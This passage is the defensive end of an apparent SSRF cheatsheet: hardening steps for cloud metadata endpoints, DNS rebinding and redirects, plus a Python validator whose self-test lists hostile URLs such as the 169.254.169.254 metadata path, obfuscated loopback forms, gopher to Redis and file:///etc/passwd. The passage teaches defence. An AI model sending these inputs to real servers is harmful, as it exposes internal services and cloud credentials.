#      - Alibaba metadata: 100.100.100.200  -- NOT link-local, blocked separately
#      - carrier-grade NAT: 100.64.0.0/10
#      - multicast/reserved: 224.0.0.0/4, 240.0.0.0/4, 0.0.0.0/8
#      - IPv4-mapped IPv6: ::ffff:0:0/96 (or disable IPv6 on the egress path)
#
# 2. Put the fetcher behind a dedicated forward PROXY with its own allowlist, in a
#    separate VPC/subnet with no IAM role attached. Then even a perfect SSRF reaches
#    nothing worth having: no credentials exist on that host to steal.
#
# 3. ENFORCE IMDSv2 and set the hop limit to 1:
#      aws ec2 modify-instance-metadata-options --instance-id i-xxx \
#        --http-tokens required --http-endpoint enabled --http-put-response-hop-limit 1
#    Better: disable the endpoint entirely where nothing uses it
#      --http-endpoint disabled
#    On GCP, the Metadata-Flavor header requirement is already mandatory; do not
#    disable it, and prefer Workload Identity over instance service accounts.
#    On Azure, prefer workload identity federation over a VM-assigned managed identity.
#    Kubernetes: block pod egress to 169.254.169.254 with a NetworkPolicy and use
#    IRSA / Workload Identity so the node role is never the pod's role.
#
# 4. RESOLVE, THEN VALIDATE THE FINAL IP -- and connect to THAT IP.
#    Validating the hostname is useless (DNS rebinding); validating the resolved IP
#    and then reconnecting by name is also useless (the second lookup can differ).
#    The correct shape is: resolve -> validate every returned address -> open the
#    socket to the validated address -> set the Host header from the original name.
#    Reject a hostname that resolves to multiple addresses where any one is private.
#
# 5. DISABLE REDIRECTS, or re-run the full validation on EVERY hop and cap the chain.
#    A validator that checks only the first URL is bypassed by a 302 in one request.
#
# 6. ALLOWLIST THE SCHEME to http/https only. This removes file://, gopher://,
#    dict://, ftp://, ldap:// and netdoc:// -- most of this cheatsheet -- in one line.
#    Also allowlist the PORT (80/443) so gopher-to-6379 has nowhere to go even if a
#    scheme slips through.
#
# 7. Do not return the fetched response body to the user. A blind SSRF is far less
#    valuable than one that echoes. Strip response headers too, and never surface the
#    upstream status code or error text verbatim -- that is the port-scan oracle.
#
# 8. Use a URL parser and an HTTP client from the SAME library, and validate with the
#    parsed components (scheme, host, port) rather than with a regex over the string.
#    Every row in the obfuscation table is two parsers disagreeing; using one parser
#    for both the check and the fetch removes the gap.
#
# 9. Time out fast, cap the response size, and rate-limit the fetcher, so an internal
#    port sweep is slow and noisy rather than free.
```

```python
#!/usr/bin/env python3
"""Validate-then-connect: resolve first, reject private addresses, and connect to the
address that was actually validated -- closing the DNS-rebinding window.

Run it directly for a self-test.
"""
import ipaddress
import socket
from urllib.parse import urlsplit

ALLOWED_SCHEMES = {"http", "https"}
ALLOWED_PORTS = {80, 443}


def _is_public(ip: str) -> bool:
    addr = ipaddress.ip_address(ip)
    # map an IPv4-mapped IPv6 address back to IPv4 before judging it, so
    # ::ffff:169.254.169.254 is treated as the link-local address it really is
    if isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:
        addr = addr.ipv4_mapped
    if (addr.is_private or addr.is_loopback or addr.is_link_local
            or addr.is_reserved or addr.is_multicast or addr.is_unspecified):
        return False
    # Alibaba's metadata host is globally routable-looking, so block it by hand
    if str(addr) == "100.100.100.200":
        return False
    return True


def safe_resolve(url: str) -> tuple[str, str, int]:
    """Return (validated_ip, hostname, port) or raise ValueError."""
    parts = urlsplit(url)
    if parts.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"scheme not allowed: {parts.scheme!r}")
    host = parts.hostname
    if not host:
        raise ValueError("no host in url")
    port = parts.port or (443 if parts.scheme == "https" else 80)
    if port not in ALLOWED_PORTS:
        raise ValueError(f"port not allowed: {port}")

    infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    ips = {i[4][0] for i in infos}
    if not ips:
        raise ValueError("no addresses")
    for ip in ips:                      # EVERY answer must be public, not just the first
        if not _is_public(ip):
            raise ValueError(f"blocked address: {ip}")
    return sorted(ips)[0], host, port
    # the caller then connects to the returned IP and sets  Host: <host>  itself,
    # and must not follow redirects without re-running this function on each hop.


if __name__ == "__main__":
    blocked = [
        "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
        "http://2852039166/", "http://0x7f000001/", "http://017700000001/",
        "http://127.1/", "http://[::1]/", "http://[::ffff:169.254.169.254]/",
        "http://10.0.0.1/", "http://192.168.1.1/", "http://100.100.100.200/",
        "gopher://127.0.0.1:6379/_x", "file:///etc/passwd",
        "http://127.0.0.1:6379/", "http://0/",
    ]
    for u in blocked:
        try:
            safe_resolve(u)
            print(f"FAIL (allowed): {u}")
        except (ValueError, socket.gaierror) as e:
            print(f"blocked  {u:52} -> {e}")
    print("self-test ok -- every hostile URL above was rejected")
```

## References

- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- https://portswigger.net/web-security/ssrf
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- https://cloud.google.com/compute/docs/metadata/overview
- https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
- https://github.com/tarunkant/Gopherus
- https://github.com/nccgroup/singularity
